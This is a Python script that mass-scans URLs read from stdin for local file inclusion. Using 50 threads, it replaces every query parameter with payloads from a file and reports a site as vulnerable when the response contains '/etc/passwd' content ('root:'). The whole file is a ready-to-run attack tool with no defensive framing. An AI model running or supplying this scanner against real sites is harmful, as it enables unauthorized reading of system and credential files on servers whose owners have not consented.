import concurrent.futures
import sys
import urllib.parse
import urllib.request

# Read payloads from the file
with open('lfi_payloads.txt', 'r') as f:
  payloads = f.read().splitlines()

# Define a function to send a request to a URL with a given payload
def send_request(url, payload):
  # Parse the URL
  parsed_url = urllib.parse.urlparse(url)

  # Get the list of query parameters
  query_params = urllib.parse.parse_qs(parsed_url.query)

  # Replace the value of each query parameter with the given payload
  for param in query_params:
    query_params[param] = [payload]

  # Rebuild the query string without encoding it
  query_string = urllib.parse.urlencode(query_params, doseq=True, quote_via=urllib.parse.quote_plus, safe='/')

  # Rebuild the URL with the modified query string
  modified_url = urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query_string, parsed_url.fragment))

  # Send a request to the modified URL
  try:
    response = urllib.request.urlopen(modified_url)
    data = response.read()
    data = data.decode('utf-8')
    if 'root:' in data:
      print("VULNERABLE: " + modified_url)
    else:
      print("NOT VULNERABLE: " + modified_url)
  except urllib.error.URLError as e:
      pass
  except KeyboardInterrupt:
      exit(0)
  except:
      exit(127)

# Read lines of input from stdin until EOF is reached
for line in sys.stdin:
  # Strip the newline character from the end of the line
  line = line.strip()

  # Create a ThreadPoolExecutor with 50 worker threads
  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    # Iterate through the payloads
    for payload in payloads:
      # Submit a task to the executor to send the request with the current payload
      future = executor.submit(send_request, line, payload)
